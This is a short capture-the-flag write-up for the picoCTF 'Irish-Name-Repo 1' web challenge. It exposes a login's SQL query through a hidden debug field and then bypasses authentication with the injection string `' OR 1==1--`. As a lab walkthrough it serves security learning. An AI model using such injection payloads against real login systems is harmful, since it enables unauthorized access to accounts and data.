## Problem Statement


### Lab 4: Irish-Name-Repo 1 (300 pts)

**Problem:**

>There is a website running at https://2019shell1.picoctf.com/problem/47253/ or http://2019shell1.picoctf.com:47253. Do you think you can log us in? Try to see if you can login!

**Hints:**

1. There doesn't seem to be many ways to interact with this, I wonder if the users are kept in a database?
2. Try to think about how does the website verify your login?

## Write-Up


Upon inspecting the login page, we can find a suspicious tag buried in the source:
```html
<input type="hidden" name="debug" value="0">
```
Setting the value to `1` and entering some username and password shows:
```
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
Login failed.
```

Notice the SQL query. Setting the username to a single quote (`'`) and logging in results in:
```
username: '
password: 
SQL query: SELECT * FROM users WHERE name=''' AND password=''
```

Reviewing the network activity shows a return code of `500: Internal Server Error`. This indicates the absence of proper SQL filtering. A simple SQL injection of `' OR 1==1--` brings us into the mainframe :).
